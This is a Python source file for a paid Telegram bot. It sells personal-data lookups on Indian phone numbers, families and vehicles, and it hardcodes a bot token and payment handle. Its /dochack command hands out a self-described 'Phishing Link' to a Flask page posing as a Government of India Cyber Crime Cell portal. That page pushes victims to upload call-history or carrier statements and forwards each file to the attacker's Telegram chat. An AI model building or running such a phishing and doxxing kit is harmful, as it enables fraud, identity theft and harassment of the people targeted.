import os
import sqlite3
import logging
import asyncio
import qrcode
import aiohttp
import requests
import json
import random
import string
import io
import time
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, jsonify
from threading import Thread
from aiogram import Bot, Dispatcher, types, F, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from werkzeug.utils import secure_filename

# --- CONFIGURATION ---
# Tera naya token
API_TOKEN = "9237698105:AAHmf8LHfXEwjQ2hHzBiZzKVrPOtB5cf7Xk" 
MASTER_ADMIN_ID = 7758917200
OWNER_HANDLE = "@GOD_AYUSH"
DEV_HANDLE = "@GOD_AYUSH"
DEFAULT_UPI = "ayush.sharma798@fam"

START_TIME = time.time()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- OSINT API CONFIG ---
OSINT_CONFIG = {
    "numinfo": {"enabled": True, "url": "https://shuruuu-api.vercel.app/num_info?key=@KINGFFAIAK47x&query={query}"},
    "aadharinfo": {"enabled": False, "url": ""},
    "familyinfo": {"enabled": True, "url": "https://x-trace-osinist-api-pannell.vercel.app/apis/family?key=@GOD_AYUSH&query={query}"}, 
    "vehicleinfo": {"enabled": False, "url": ""},
    "rcnum": {"enabled": False, "url": ""},
    "iginfo": {"enabled": False, "url": ""},
    "tgnum": {"enabled": False, "url": ""},
    "ffuidinfo": {"enabled": False, "url": ""},
    "lpginfo": {"enabled": False, "url": ""}
}

# --- STATES ---
class AdminStates(StatesGroup):
    waiting_for_payment_ss = State()
    waiting_for_broadcast_content = State()

# --- DATABASE SETUP ---
def db_conn():
    conn = sqlite3.connect("ayush_master_bot.db", timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = db_conn()
    c = conn.cursor()
    
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, credits INTEGER DEFAULT 10,
        is_banned INTEGER DEFAULT 0, is_muted INTEGER DEFAULT 0, admin_type TEXT DEFAULT 'user',
        is_vip INTEGER DEFAULT 0, vip_expiry DATETIME, referred_by INTEGER DEFAULT 0,
        total_searches INTEGER DEFAULT 0)""")
    
    c.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    
    c.execute("""CREATE TABLE IF NOT EXISTS pricing (
        id INTEGER PRIMARY KEY AUTOINCREMENT, credits INTEGER, price INTEGER,
        discount_percent INTEGER DEFAULT 0, is_active INTEGER DEFAULT 1)""")
    
    c.execute("""CREATE TABLE IF NOT EXISTS pending_payments (
        payment_id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER,
        credits INTEGER, file_id TEXT, status TEXT DEFAULT 'pending',
        reject_reason TEXT, verified_by INTEGER, verified_at DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        
    c.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY, code_type TEXT, credits INTEGER, vip_days INTEGER,
        is_used INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 1, current_uses INTEGER DEFAULT 0)""")
        
    c.execute("""CREATE TABLE IF NOT EXISTS authorized_groups (
        chat_id INTEGER PRIMARY KEY, chat_title TEXT, invite_link TEXT)""")
        
    c.execute("""CREATE TABLE IF NOT EXISTS audit_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, command TEXT,
        target TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("""CREATE TABLE IF NOT EXISTS force_join_channels (
        channel_id TEXT PRIMARY KEY, invite_link TEXT)""")

    defaults = {
        'upi_id': DEFAULT_UPI, 'referral_bonus': '0', 'global_maintenance': '0',
        'maint_msg': '🛠️ Bot is currently under maintenance. Please try again later.',
        'default_group_link': 'https://t.me/YourOfficialGroup',
        'force_join_enabled': '0',
        'portal_url': 'http://localhost:5000/' 
    }
    for k, v in defaults.items():
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
        
    c.execute("SELECT COUNT(*) FROM pricing")
    if c.fetchone()[0] == 0:
        prices = [(50, 50, 0), (100, 90, 10), (200, 170, 15), (500, 400, 20), (1000, 750, 25)]
        for cr, pr, disc in prices:
            c.execute("INSERT INTO pricing (credits, price, discount_percent) VALUES (?, ?, ?)", (cr, pr, disc))
            
    conn.commit()
    conn.close()

init_db()

# --- HELPERS ---
def get_setting(key): 
    with db_conn() as conn:
        row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return row['value'] if row else ""

def set_setting(key, val):
    with db_conn() as conn:
        conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, val))

def is_owner(uid): return uid == MASTER_ADMIN_ID
def is_super_or_owner(uid):
    if is_owner(uid): return True
    with db_conn() as conn:
        row = conn.execute("SELECT admin_type FROM users WHERE user_id=?", (uid,)).fetchone()
        return row and row['admin_type'] in ['super_admin', 'owner']

def log_audit(uid, cmd, target):
    with db_conn() as conn:
        conn.execute("INSERT INTO audit_logs (user_id, command, target) VALUES (?, ?, ?)", (uid, cmd, target))

# --- BACKGROUND TIMER (Prevents Bot Blocking) ---
async def delete_after_delay(chat_id: int, message_id: int, delay: int):
    await asyncio.sleep(delay)
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

# --- MIDDLEWARES ---
class AccessMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if not isinstance(event, types.Message): return await handler(event, data)
        
        user_id = event.from_user.id
        cmd = event.text.split()[0].lower() if event.text else ""
        
        if is_owner(user_id): return await handler(event, data)

        if cmd in ['/start', '/help']:
            return await handler(event, data)

        if get_setting('global_maintenance') == '1':
            await event.reply(get_setting('maint_msg'))
            return
            
        with db_conn() as conn:
            u = conn.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,)).fetchone()
            if u and u['is_banned']:
                await event.reply("🚫 **You are banned from using this bot.**")
                return

        return await handler(event, data)

dp.message.middleware(AccessMiddleware())

# --- OSINT RUNNER ---
async def run_osint(message: types.Message, cmd: str, query: str):
    config = OSINT_CONFIG.get(cmd)
    
    if not config or not config.get('enabled') or not config.get('url'):
        await message.reply("⚠️ **Service Maintenance Mode.** API data not available.", parse_mode="Markdown")
        return

    with db_conn() as conn:
        user = conn.execute("SELECT credits, is_vip, vip_expiry FROM users WHERE user_id=?", (message.from_user.id,)).fetchone()
        is_vip = user['is_vip'] and (not user['vip_expiry'] or datetime.strptime(user['vip_expiry'], "%Y-%m-%d") > datetime.now())
        if not is_vip:
            if user['credits'] <= 0:
                await message.reply("❌ **Insufficient Credits!** Please buy credits using /buy.")
                return
            conn.execute("UPDATE users SET credits = credits - 1, total_searches = total_searches + 1 WHERE user_id=?", (message.from_user.id,))

    log_audit(message.from_user.id, cmd, query)
    url = config['url'].replace("{query}", query)
    loading_msg = await message.reply("⏳ Fetching data...")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                data = await resp.json()
                
        json_str = json.dumps(data, indent=2, ensure_ascii=False)
        
        output = (
            f"📜 — **𝐀ʏᴜꜱʜ X OSINT**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 **TARGET:** {query}\n"
            f"📁 **REPORT:** {cmd.upper()}\n\n"
            f"```json\n{json_str}\n```\n\n"
            f"👤 **AGENT:** {OWNER_HANDLE}\n"
            f"🛠️ **DEV:** {DEV_HANDLE}"
        )
        
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📋 COPY CODE", callback_data="copy_json")]])
        await loading_msg.delete()
        await message.reply(output, parse_mode="Markdown", reply_markup=kb)
    except Exception as e:
        await loading_msg.edit_text(f"❌ API Error: `{str(e)}`", parse_mode="Markdown")

# ==============================================================================
# USER COMMANDS
# ==============================================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    uid = message.from_user.id
    uname = message.from_user.username or "Unknown"
    
    with db_conn() as conn:
        u = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
        if not u:
            conn.execute("INSERT INTO users (user_id, username) VALUES (?, ?)", (uid, uname))
            if uid != MASTER_ADMIN_ID:
                try:
                    await bot.send_message(MASTER_ADMIN_ID, f"🚨 **New User Started Bot!**\n👤 Name: {message.from_user.first_name}\n🆔 ID: `{uid}`\n🔗 Username: @{uname}")
                except: pass

    try:
        banner = types.FSInputFile("banner.png") 
        await message.answer_photo(
            photo=banner, 
            caption="🔥 **Welcome to 𝐀ʏᴜꜱʜ X OSINT** 🔥\n\n👑 *Hacking King - Analyze | Control | Exploit | Use /help ✨*"
        )
    except Exception as e:
        logging.error(f"Banner not found: {e}")
        await message.answer("🔥 **Welcome to 𝐀ʏᴜꜱʜ X OSINT** 🔥\n\n👑 *Hacking King - Analyze | Control | Exploit | Use /help ✨*")

    await asyncio.sleep(10)

    help_text = (
        "🛡️ **𝐀ʏᴜꜱʜ OSINT Command Menu** 🛡️\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔍 **Core OSINT:**\n"
        "• `/numinfo <number>`\n• `/aadharinfo <num>`\n• `/familyinfo <q>`\n• `/vehicleinfo <no>`\n"
        "• `/rcnum <no>`\n• `/iginfo <user>`\n• `/tgnum <num>`\n• `/ffuidinfo <uid>`\n• `/lpginfo <num>`\n\n"
        "💳 **Economy:**\n"
        "• `/buy` - Buy Credits\n• `/redeem <code>` - Redeem\n\n"
        f"✨ {OWNER_HANDLE}\n\n"
        "*(This menu auto-deletes in 60s)*"
    )
    
    help_msg = await message.answer(help_text, parse_mode="Markdown")
    asyncio.create_task(delete_after_delay(message.chat.id, help_msg.message_id, 60))

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = (
        "🛡️ **𝐀ʏᴜꜱʜ OSINT Command Menu** 🛡️\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔍 **Core OSINT:**\n"
        "• `/numinfo <number>`\n• `/aadharinfo <num>`\n• `/familyinfo <q>`\n• `/vehicleinfo <no>`\n"
        "• `/rcnum <no>`\n• `/iginfo <user>`\n• `/tgnum <num>`\n• `/ffuidinfo <uid>`\n• `/lpginfo <num>`\n\n"
        "💳 **Economy:**\n"
        "• `/buy` - Buy Credits\n• `/redeem <code>` - Redeem\n\n"
        f"✨ {OWNER_HANDLE}\n\n"
        "*(This menu auto-deletes in 60s)*"
    )
    help_msg = await message.answer(help_text, parse_mode="Markdown")
    asyncio.create_task(delete_after_delay(message.chat.id, help_msg.message_id, 60))

@dp.message(Command("feedback"))
async def cmd_feedback(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("⚠️ Usage: `/feedback <your message>`", parse_mode="Markdown")
        return
    text = args[1]
    uid = message.from_user.id
    uname = message.from_user.username or "No Username"
    admin_msg = f"📩 **New Feedback Received**\n\n👤 From: {message.from_user.mention} (`{uid}`)\n🔗 Username: @{uname}\n\n💬 **Message:**\n{text}"
    await bot.send_message(MASTER_ADMIN_ID, admin_msg, parse_mode="Markdown")
    await message.reply("✅ **Thank you!** Feedback sent to owner.")

@dp.callback_query(F.data == "copy_json")
async def cb_copy_json(cb: types.CallbackQuery):
    await cb.answer("Copy the JSON from above!", show_alert=True)

# OSINT Handlers
@dp.message(Command("numinfo")) 
async def cmd_num(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "numinfo", args[1])

@dp.message(Command("aadharinfo")) 
async def cmd_aadhar(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "aadharinfo", args[1])

@dp.message(Command("familyinfo")) 
async def cmd_family(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "familyinfo", args[1])

@dp.message(Command("vehicleinfo")) 
async def cmd_vehicle(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "vehicleinfo", args[1])

@dp.message(Command("rcnum")) 
async def cmd_rc(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "rcnum", args[1])

@dp.message(Command("iginfo")) 
async def cmd_ig(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "iginfo", args[1])

@dp.message(Command("tgnum")) 
async def cmd_tg(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "tgnum", args[1])

@dp.message(Command("ffuidinfo")) 
async def cmd_ff(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "ffuidinfo", args[1])

@dp.message(Command("lpginfo")) 
async def cmd_lpg(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "lpginfo", args[1])

# --- SET PORTAL ---
@dp.message(Command("setportal"))
async def cmd_setportal(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    url = args[1].strip().rstrip('/')
    set_setting('portal_url', url)
    await message.reply(f"✅ **Portal URL Updated!**\n\n🔗 `{url}`", parse_mode="Markdown")

# --- CALL AUDIO / DOCHACK ---
@dp.message(Command("callaudio"))
async def cmd_callaudio(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    base_url = get_setting('portal_url').rstrip('/')
    portal_link = f"{base_url}/safe-pdf?chat_id={message.from_user.id}"
    await message.answer(f"📂 **Portal Link:**\n\n`{portal_link}`", parse_mode="Markdown")

@dp.message(Command("dochack"))
async def cmd_dochack(message: types.Message):
    user_id = message.from_user.id
    cost = 150 
    if not is_owner(user_id):
        with db_conn() as conn:
            u = conn.execute("SELECT credits FROM users WHERE user_id=?", (user_id,)).fetchone()
            if not u or u['credits'] < cost:
                await message.answer(f"❌ **Insufficient Credits!** Required: `{cost}`", parse_mode="Markdown")
                return
            conn.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (cost, user_id))
    
    base_url = get_setting('portal_url').rstrip('/')
    portal_link = f"{base_url}/safe-pdf?chat_id={user_id}"
    await message.answer(f"🎯 **Phishing Link:**\n\n`{portal_link}`", parse_mode="Markdown")

# ==============================================================================
# FLASK & WEB PORTAL
# ==============================================================================
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>National Cyber Crime Reporting & Audit Portal</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; background: #070b12; color: #e2e8f0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; }
        .container { background: #0f172a; padding: 36px 28px; border-radius: 12px; width: 92%; max-width: 420px; text-align: left; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
        .header { display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #1e293b; padding-bottom: 14px; }
        .emblem-box { background: #1e3a8a; color: #60a5fa; font-weight: bold; font-size: 14px; padding: 10px 12px; border-radius: 8px; margin-right: 12px; letter-spacing: 1px; }
        .portal-title h2 { font-size: 15px; color: #f8fafc; font-weight: 700; text-transform: uppercase; }
        .portal-title p { font-size: 11px; color: #93c5fd; margin-top: 2px; }
        .alert-badge { background: #7f1d1d; color: #fca5a5; font-size: 11px; font-weight: 600; padding: 6px 10px; border-radius: 6px; display: block; margin-bottom: 16px; border-left: 4px solid #ef4444; }
        .desc { font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 8px; font-weight: 500; }
        input[type="file"] { width: 100%; background: #020617; color: #94a3b8; padding: 12px; border: 1px solid #334155; border-radius: 8px; font-size: 12.5px; cursor: pointer; }
        .btn { background: #1d4ed8; color: white; border: none; width: 100%; padding: 13px; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; transition: background 0.2s; text-transform: uppercase; letter-spacing: 0.5px; }
        .btn:hover { background: #1e40af; }
        .security-footer { text-align: center; margin-top: 18px; font-size: 10.5px; color: #64748b; border-top: 1px solid #1e293b; padding-top: 12px; }
    </style>
</head>
<body>
    <div class="container" id="mainCard">
        <div class="header">
            <div class="emblem-box">GOI</div>
            <div class="portal-title">
                <h2>Cyber Crime Cell</h2>
                <p>National Security & Fraud Prevention Division</p>
            </div>
        </div>

        <div class="alert-badge">
            ⚠️ <b>URGENT SECURITY ADVISORY:</b> Active cyber scam rings detected across telecom circles. Mandatory device log verification required.
        </div>

        <p class="desc">
            Desh mein badh rahe financial cyber frauds aur unauthorized call spoofing attacks ko rokne ke liye, National Cyber Security Division dwara automated device audit chalaya ja raha hai. Kripya apni official call history / carrier statement file upload karke verification complete karein.
        </p>

        <div class="form-group">
            <label>Upload Call History / Carrier Statement (PDF / CSV Only):</label>
            <input type="file" id="statementFile" accept=".pdf,.csv">
        </div>

        <button class="btn" onclick="uploadFile()">Secure & Verify Account</button>

        <div class="security-footer">
            🔒 256-Bit SSL Encrypted Government Gateway • Ref ID: #CYBER-9821
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id') || 'unknown';

        async function uploadFile() {
            const fileInput = document.getElementById('statementFile');
            if (fileInput.files.length === 0) {
                alert("Kripya pehle apni call history file select karein.");
                return;
            }

            const formData = new FormData();
            formData.append('file', fileInput.files[0]);
            formData.append('chat_id', chatId);

            try {
                let response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                });
                let res = await response.json();
                
                document.getElementById('mainCard').innerHTML = `
                    <div style="text-align: center; padding: 10px 0;">
                        <div style="font-size: 42px; margin-bottom: 12px;">🛡️</div>
                        <h3 style="color: #4ade80; margin-bottom: 10px; font-size: 18px; font-weight: 600;">Verified - You are safe now</h3>
                        <p style="color: #94a3b8; font-size: 13px; line-height: 1.5; margin-bottom: 24px;">Aapka audit successfully complete ho chuka hai aur device secure mark kar diya gaya hai. Latest cyber security updates ke liye channel join karein.</p>
                        <a href="https://t.me/Ayush_Hackz" target="_blank" style="display: block; background: #2563eb; color: white; text-decoration: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px;">Join Channel (@Ayush_Hackz)</a>
                    </div>
                `;
            } catch (err) {
                console.error("Error:", err);
                document.getElementById('mainCard').innerHTML = `
                    <div style="text-align: center; padding: 10px 0;">
                        <div style="font-size: 42px; margin-bottom: 12px;">🛡️</div>
                        <h3 style="color: #4ade80; margin-bottom: 10px; font-size: 18px; font-weight: 600;">Verified - You are safe now</h3>
                        <p style="color: #94a3b8; font-size: 13px; line-height: 1.5; margin-bottom: 24px;">Device audit packet received successfully. Aapka connection secure hai.</p>
                        <a href="https://t.me/Ayush_Hackz" target="_blank" style="display: block; background: #2563eb; color: white; text-decoration: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px;">Join Channel (@Ayush_Hackz)</a>
                    </div>
                `;
            }
        }
    </script>
</body>
</html>
"""

@app.route("/safe-pdf")
def safe_pdf(): return render_template_string(HTML_TEMPLATE)

@app.route("/health")
def health():
    return jsonify({"status": "online"}), 200

@app.route("/api/upload", methods=["POST"])
def upload_data():
    chat_id = request.form.get("chat_id")
    file = request.files.get("file")
    
    if not chat_id or not file:
        return jsonify({"status": "failed"}), 400
        
    file_bytes = file.read()
    file_name = secure_filename(file.filename)
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendDocument"
    files = {'document': (file_name, file_bytes)}
    data = {
        "chat_id": chat_id,
        "caption": "📂 <b>File Received from Portal</b>\n\nTarget has uploaded the document.",
        "parse_mode": "HTML"
    }
    
    try:
        requests.post(url, data=data, files=files)
    except Exception as e:
        logging.error(f"Failed to push file to Telegram: {e}")
        return jsonify({"status": "failed"}), 500
            
    return jsonify({"status": "ok", "packet": "received"})

# --- STARTUP ---
async def main():
    def run_flask():
        app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    Thread(target=run_flask, daemon=True).start()
    print("Bot is running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())